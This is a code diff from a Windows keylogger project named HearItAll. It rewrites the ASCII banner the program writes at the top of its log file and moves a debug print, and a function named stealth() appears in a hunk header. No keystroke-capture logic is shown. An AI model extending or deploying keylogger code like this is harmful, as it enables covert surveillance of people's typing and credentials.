@@ -118,20 +118,34 @@ void stealth()
 void initialize(ofstream *file)
 {
     string dateTime = currentDateTime();
+	string str;
 
-    *file << "\n\n\n";
-    *file << "**********************************************************\n";
-    *file << "****               HearItAll Keylogger                ****\n";
-    *file << "****                (Windows Version)                 ****\n";
-    *file << "****--------------------------------------------------****\n";
-    *file << "****                                                  ****\n";
-    *file << "****    Created by: Ander Granado                     ****\n";
-    *file << "****                                                  ****\n";
-    *file << "**********************************************************\n";
-    *file << "****   Session timestamp: ";
-    *file << dateTime;
-    *file << "         ****\n";
-    *file << "**********************************************************\n\n";
+	str += "\n";
+	str += "|***********************************************************|\n";
+	str += "|   _   _                       _____  _       ___   _  _   |\n";
+	str += "|  | | | |                     |_   _|| |     / _ \\ | || |  |\n";
+	str += "|  | |_| |  ___   __ _  _ __     | |  | |_   / /_\\ \\| || |  |\n";
+	str += "|  |  _  | / _ \\ / _` || '__|    | |  | __|  |  _  || || |  |\n";
+	str += "|  | | | ||  __/| (_| || |      _| |_ | |_   | | | || || |  |\n";
+	str += "|  \\_| |_/ \\___| \\__,_||_|      \\___/  \\__|  \\_| |_/|_||_|  |\n";
+	str += "|                                                           |\n";
+	str += "|                                                           |\n";
+	str += "|                      Windows version                      |\n";
+	str += "|                                                           |\n";
+	str += "|***********************************************************|\n";
+	str += "|                                                           |\n";
+	str += "| Created by: Ander Granado                                 |\n";
+	str += "|                                                           |\n";
+	str += "| Avaiable here: https://github.com/ander94lakx/HearItAll   |\n";
+	str += "|                                                           |\n";
+	str += "| Session timestamp: " + dateTime + "                    |\n";
+	str += "|                                                           |\n";
+	str += "|***********************************************************|\n\n";
+
+	if (DEBUG)
+		cout << str;
+
+	*file << str;
 }
 
 const string currentDateTime()
@@ -145,9 +159,6 @@ const string currentDateTime()
 
     strftime(buffer, 80, "%d-%m-%Y %I:%M:%S", timeinfo);
     string str(buffer);
-
-    if(DEBUG)
-        cout << str;
 
     return str;
 }
